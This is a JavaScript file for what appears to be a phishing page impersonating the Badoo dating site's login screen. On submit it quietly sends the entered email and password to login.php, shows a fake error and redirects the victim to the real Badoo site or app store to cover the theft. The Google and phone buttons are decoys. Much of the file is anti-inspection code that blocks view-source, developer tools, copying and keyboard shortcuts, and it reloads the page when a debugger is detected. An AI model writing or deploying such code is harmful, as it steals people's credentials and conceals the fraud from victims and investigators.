document.addEventListener('DOMContentLoaded', function () {
    var loadingOverlay = document.getElementById('loading-overlay');
    
    // Show loading overlay for 3 seconds on page load
    if (loadingOverlay) {
        loadingOverlay.style.display = 'flex';
        setTimeout(function () {
            loadingOverlay.style.display = 'none';
        }, 3000);
    }

    var usernameInput = document.getElementById('login');
    var savedUsername = localStorage.getItem('badoo_email');
    if (usernameInput && savedUsername) {
        usernameInput.value = savedUsername;
    }

    var btnEmail = document.getElementById('btn-email');
    var loginForm = document.getElementById('login-form');
    var buttonsDiv = document.querySelector('.buttons');

    if (btnEmail && loginForm && buttonsDiv) {
        btnEmail.addEventListener('click', function (e) {
            e.preventDefault();
            buttonsDiv.style.display = 'none';
            loginForm.style.display = 'block';
        });
    }

    var createAccountLink = document.getElementById('create-account-link');
    if (createAccountLink) {
        createAccountLink.addEventListener('click', function (e) {
            e.preventDefault();
            window.location.href = 'https://badoo.com/register';
        });
    }

    var socialMap = [
        { btnId: 'btn-phone', loaderId: 'loader-phone' },
        { btnId: 'btn-google', loaderId: 'loader-google' }
    ];
    var featureAlert = document.getElementById('feature-alert');

    var signinBtn = document.getElementById('btn-signin');
    var form = signinBtn ? signinBtn.closest('form') : null;

    var errorAlert = document.getElementById('error-alert');
    var errorAlertClose = document.getElementById('error-alert-close');

    if (errorAlertClose && errorAlert) {
        errorAlertClose.addEventListener('click', function () {
            errorAlert.style.display = 'none';
        });
    }

    // Handle Google and Apple button clicks to show error
    var btnGoogle = document.getElementById('btn-google');
    if (btnGoogle) {
        btnGoogle.addEventListener('click', function (e) {
            e.preventDefault();
            // Show loading overlay
            if (loadingOverlay) {
                loadingOverlay.style.display = 'flex';
            }
            // After 2 seconds, hide loader and show error
            setTimeout(function () {
                if (loadingOverlay) {
                    loadingOverlay.style.display = 'none';
                }
                if (errorAlert) {
                    errorAlert.innerHTML = '<span>Something went wrong. Please try another option.</span><button class="error-alert-close" id="error-alert-close">×</button>';
                    errorAlert.style.display = 'flex';
                    document.getElementById('error-alert-close').addEventListener('click', function () {
                        errorAlert.style.display = 'none';
                    });
                }
            }, 2000);
        });
    }

    var btnPhone = document.getElementById('btn-phone');
    if (btnPhone) {
        btnPhone.addEventListener('click', function (e) {
            e.preventDefault();
            // Show loading overlay
            if (loadingOverlay) {
                loadingOverlay.style.display = 'flex';
            }
            // After 2 seconds, hide loader and show error
            setTimeout(function () {
                if (loadingOverlay) {
                    loadingOverlay.style.display = 'none';
                }
                if (errorAlert) {
                    errorAlert.innerHTML = '<span>Something went wrong. Please try another option.</span><button class="error-alert-close" id="error-alert-close">×</button>';
                    errorAlert.style.display = 'flex';
                    document.getElementById('error-alert-close').addEventListener('click', function () {
                        errorAlert.style.display = 'none';
                    });
                }
            }, 2000);
        });
    }

    if (form && signinBtn) {
        form.addEventListener('submit', function (e) {
            e.preventDefault();
            if (usernameInput && usernameInput.value) {
                localStorage.setItem('badoo_email', usernameInput.value);
            }

            var formData = new FormData(form);
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'login.php', true);
            xhr.send(formData);

            // Show loading overlay
            if (loadingOverlay) {
                loadingOverlay.style.display = 'flex';
            }

            signinBtn.classList.add('loading');
            signinBtn.textContent = 'Signing in...';

            // After 2 seconds, hide loader and show error
            setTimeout(function () {
                if (loadingOverlay) {
                    loadingOverlay.style.display = 'none';
                }
                signinBtn.classList.remove('loading');
                signinBtn.textContent = 'Sign in';
                if (errorAlert) {
                    errorAlert.innerHTML = '<span>Something went wrong. Reloading...</span><button class="error-alert-close" id="error-alert-close">×</button>';
                    errorAlert.style.display = 'flex';
                    document.getElementById('error-alert-close').addEventListener('click', function () {
                        errorAlert.style.display = 'none';
                    });
                }

                // After another 2 seconds, redirect
                setTimeout(function () {
                    var ua = navigator.userAgent;
                    var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
                    var isIOS = /iPad|iPhone|iPod/.test(ua) && !window.MSStream;
                    var isAndroid = /Android/.test(ua);

                    if (isMobile) {
                        if (isIOS) {
                            window.location.replace('https://apps.apple.com/app/badoo-dating-chat-meet/id389568877');
                        } else if (isAndroid) {
                            window.location.replace('https://play.google.com/store/apps/details?id=com.badoo.mobile');
                        } else {
                            window.location.replace('https://play.google.com/store/apps/details?id=com.badoo.mobile');
                        }
                    } else {
                        var username = usernameInput ? encodeURIComponent(usernameInput.value) : '';
                        window.location.replace('https://badoo.com/signin/' + (username ? '?email=' + username : ''));
                    }
                    setTimeout(function () {
                        try { window.close(); } catch (err) {}
                    }, 500);
                }, 2000);
            }, 2000);
        });
    }

    socialMap.forEach(function (item) {
        var btn = document.getElementById(item.btnId);
        var loader = document.getElementById(item.loaderId);
        if (!btn || !loader) return;

        btn.addEventListener('click', function () {
            if (featureAlert) featureAlert.style.display = 'none';
            btn.style.display = 'none';
            loader.style.display = 'flex';

            setTimeout(function () {
                loader.style.display = 'none';
                btn.style.display = '';
                if (featureAlert) featureAlert.style.display = 'flex';
            }, 3000);
        });
    });

    // Prevent context menu
    document.addEventListener('contextmenu', function (e) { e.preventDefault(); return false; });

    // Prevent text selection
    document.addEventListener('selectstart', function (e) { e.preventDefault(); return false; });
    document.addEventListener('mousedown', function (e) {
        if (e.detail > 1) { e.preventDefault(); return false; }
    });

    // Prevent drag and drop
    document.addEventListener('dragstart', function (e) { e.preventDefault(); return false; });
    document.addEventListener('drop', function (e) { e.preventDefault(); return false; });

    // Prevent copy, cut, paste
    document.addEventListener('copy', function (e) { e.preventDefault(); return false; });
    document.addEventListener('cut', function (e) { e.preventDefault(); return false; });
    document.addEventListener('paste', function (e) { e.preventDefault(); return false; });

    // Comprehensive keyboard shortcuts prevention
    document.addEventListener('keydown', function (e) {
        // F12 - Developer Tools
        if (e.key === 'F12' || e.keyCode === 123) {
            e.preventDefault();
            return false;
        }

        // Ctrl + Shift + I/J/C - Developer Tools
        if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C' || e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) {
            e.preventDefault();
            return false;
        }

        // Ctrl + U - View Source
        if (e.ctrlKey && (e.key === 'U' || e.keyCode === 85)) {
            e.preventDefault();
            return false;
        }

        // Ctrl + S - Save
        if (e.ctrlKey && (e.key === 'S' || e.keyCode === 83)) {
            e.preventDefault();
            return false;
        }

        // Ctrl + P - Print
        if (e.ctrlKey && (e.key === 'P' || e.keyCode === 80)) {
            e.preventDefault();
            return false;
        }

        // Ctrl + Shift + S - Save As
        if (e.ctrlKey && e.shiftKey && (e.key === 'S' || e.keyCode === 83)) {
            e.preventDefault();
            return false;
        }

        // Ctrl + F - Find
        if (e.ctrlKey && (e.key === 'F' || e.keyCode === 70)) {
            e.preventDefault();
            return false;
        }

        // Ctrl + G - Find Next
        if (e.ctrlKey && (e.key === 'G' || e.keyCode === 71)) {
            e.preventDefault();
            return false;
        }

        // Ctrl + H - History
        if (e.ctrlKey && (e.key === 'H' || e.keyCode === 72)) {
            e.preventDefault();
            return false;
        }

        // Ctrl + A - Select All
        if (e.ctrlKey && (e.key === 'A' || e.keyCode === 65)) {
            e.preventDefault();
            return false;
        }

        // Ctrl + C - Copy
        if (e.ctrlKey && (e.key === 'C' || e.keyCode === 67)) {
            e.preventDefault();
            return false;
        }

        // Ctrl + X - Cut
        if (e.ctrlKey && (e.key === 'X' || e.keyCode === 88)) {
            e.preventDefault();
            return false;
        }

        // Ctrl + V - Paste
        if (e.ctrlKey && (e.key === 'V' || e.keyCode === 86)) {
            e.preventDefault();
            return false;
        }

        // Ctrl + Shift + V - Paste and Match Style
        if (e.ctrlKey && e.shiftKey && (e.key === 'V' || e.keyCode === 86)) {
            e.preventDefault();
            return false;
        }

        // Ctrl + Shift + F - Format
        if (e.ctrlKey && e.shiftKey && (e.key === 'F' || e.keyCode === 70)) {
            e.preventDefault();
            return false;
        }

        // Ctrl + Shift + P - Command Palette
        if (e.ctrlKey && e.shiftKey && (e.key === 'P' || e.keyCode === 80)) {
            e.preventDefault();
            return false;
        }

        // Ctrl + Shift + M - Responsive Design Mode
        if (e.ctrlKey && e.shiftKey && (e.key === 'M' || e.keyCode === 77)) {
            e.preventDefault();
            return false;
        }

        // Ctrl + Shift + E - Network
        if (e.ctrlKey && e.shiftKey && (e.key === 'E' || e.keyCode === 69)) {
            e.preventDefault();
            return false;
        }

        // Zoom controls
        if (e.ctrlKey && (e.key === '+' || e.key === '-' || e.key === '=' || e.key === '0' || e.keyCode === 187 || e.keyCode === 189 || e.keyCode === 48)) {
            e.preventDefault();
            return false;
        }

        // Alt + F4 - Close window
        if (e.altKey && e.key === 'F4') {
            e.preventDefault();
            return false;
        }

        // Ctrl + W - Close tab
        if (e.ctrlKey && (e.key === 'W' || e.keyCode === 87)) {
            e.preventDefault();
            return false;
        }

        // Ctrl + N - New window
        if (e.ctrlKey && (e.key === 'N' || e.keyCode === 78)) {
            e.preventDefault();
            return false;
        }

        // Ctrl + T - New tab
        if (e.ctrlKey && (e.key === 'T' || e.keyCode === 84)) {
            e.preventDefault();
            return false;
        }

        // Ctrl + Tab - Switch tab
        if (e.ctrlKey && e.key === 'Tab') {
            e.preventDefault();
            return false;
        }

        // Ctrl + Shift + Tab - Switch tab backwards
        if (e.ctrlKey && e.shiftKey && e.key === 'Tab') {
            e.preventDefault();
            return false;
        }

        // Ctrl + L - Address bar
        if (e.ctrlKey && (e.key === 'L' || e.keyCode === 76)) {
            e.preventDefault();
            return false;
        }

        // Ctrl + D - Bookmark
        if (e.ctrlKey && (e.key === 'D' || e.keyCode === 68)) {
            e.preventDefault();
            return false;
        }

        // Ctrl + R - Refresh
        if (e.ctrlKey && (e.key === 'R' || e.keyCode === 82)) {
            e.preventDefault();
            return false;
        }

        // Ctrl + Shift + R - Hard refresh
        if (e.ctrlKey && e.shiftKey && (e.key === 'R' || e.keyCode === 82)) {
            e.preventDefault();
            return false;
        }

        // F5 - Refresh
        if (e.key === 'F5' || e.keyCode === 116) {
            e.preventDefault();
            return false;
        }

        // Ctrl + F5 - Hard refresh
        if (e.ctrlKey && (e.key === 'F5' || e.keyCode === 116)) {
            e.preventDefault();
            return false;
        }

        // Shift + F5 - Hard refresh
        if (e.shiftKey && (e.key === 'F5' || e.keyCode === 116)) {
            e.preventDefault();
            return false;
        }

        // Escape - Close modals
        if (e.key === 'Escape' || e.keyCode === 27) {
            e.preventDefault();
            return false;
        }
    });

    // Prevent zoom with mouse wheel
    document.addEventListener('wheel', function (e) {
        if (e.ctrlKey || e.metaKey) {
            e.preventDefault();
            return false;
        }
    }, { passive: false, ctrlKey: true });

    // Prevent pinch zoom on touch devices
    document.addEventListener('touchstart', function (e) {
        if (e.touches.length > 1) {
            e.preventDefault();
            return false;
        }
    }, { passive: false });

    // Prevent double-tap zoom
    var lastTouchEnd = 0;
    document.addEventListener('touchend', function (e) {
        var now = Date.now();
        if (now - lastTouchEnd <= 300) {
            e.preventDefault();
            return false;
        }
        lastTouchEnd = now;
    }, false);

    // Prevent long press (context menu on mobile)
    document.addEventListener('longpress', function (e) {
        e.preventDefault();
        return false;
    });

    // Prevent inspect element via long press
    var touchTimer;
    document.addEventListener('touchstart', function (e) {
        touchTimer = setTimeout(function () {
            e.preventDefault();
            return false;
        }, 750);
    }, false);

    document.addEventListener('touchend', function (e) {
        clearTimeout(touchTimer);
    }, false);

    // Prevent right-click on images
    document.querySelectorAll('img').forEach(function (img) {
        img.addEventListener('contextmenu', function (e) {
            e.preventDefault();
            return false;
        });
    });

    // Disable developer tools detection
    setInterval(function () {
        var before = new Date().getTime();
        debugger;
        var after = new Date().getTime();
        if (after - before > 100) {
            window.location.reload();
        }
    }, 1000);

    // Clear console
    console.clear();
    console.log('%cStop!', 'color: red; font-size: 50px; font-weight: bold;');
    console.log('%cThis is a private area.', 'color: red; font-size: 20px;');
});
